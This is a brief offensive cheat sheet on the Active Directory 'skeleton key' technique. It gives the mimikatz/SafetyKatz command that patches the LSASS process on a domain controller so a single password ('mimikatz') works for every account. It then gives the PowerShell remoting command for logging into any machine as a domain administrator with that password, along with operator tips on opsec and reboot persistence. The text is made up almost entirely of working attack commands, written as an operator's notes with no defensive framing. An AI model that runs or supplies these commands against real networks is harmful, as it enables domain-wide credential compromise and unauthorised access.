patch the domain controller (LSASS process) so that it allows access as any user with a single password
- all publicly known methods are NOT persistent across reboots
- done with mimikatz

# Mimikatz

inject a skeleton key (password would be mimikatz - DA privs required)
`SafetyKatz.exe '"privilege::debug" "misc::skeleton"' -ComputerName <hostname>.<DOMAIN>`

access any machine with a valid username and password as "mimikatz"
`Enter-PSSession -ComputerName <hostname> -credential <DOMAIN>\Administrator`
- not opsec safe
- causes issues with ADCS

